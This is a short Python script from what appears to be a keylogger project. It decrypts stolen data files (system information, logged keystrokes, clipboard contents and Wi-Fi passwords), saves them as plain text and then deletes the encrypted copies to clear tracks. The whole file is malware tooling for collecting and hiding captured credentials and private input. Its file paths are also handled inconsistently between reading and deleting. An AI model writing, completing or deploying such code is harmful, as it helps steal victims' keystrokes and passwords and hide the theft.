from cryptography.fernet import Fernet
from project.keylogger import e_key, file_merge
import os

sys_encr = "e_sys.txt"
key_encr = "e_key.txt"
clip_encr = "e_clip.txt"
wifi_encr = "e_wifi.txt"


encrypted_files = [sys_encr, key_encr, clip_encr, wifi_encr]
files = ["system_info.txt", "keylogger.txt", "clipboard_data.txt", "wifi_password.txt"]
count = 0

for decrypting_file in encrypted_files:
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(e_key)
    decrypted = fernet.decrypt(data)

    with open(files[count], 'wb') as f:
        f.write(decrypted)

    count += 1

#clearing encrypted files
delete_file = [sys_encr, key_encr, clip_encr, wifi_encr]
for file in delete_file:
    os.remove(file_merge + file)

print("all tracks cleared")
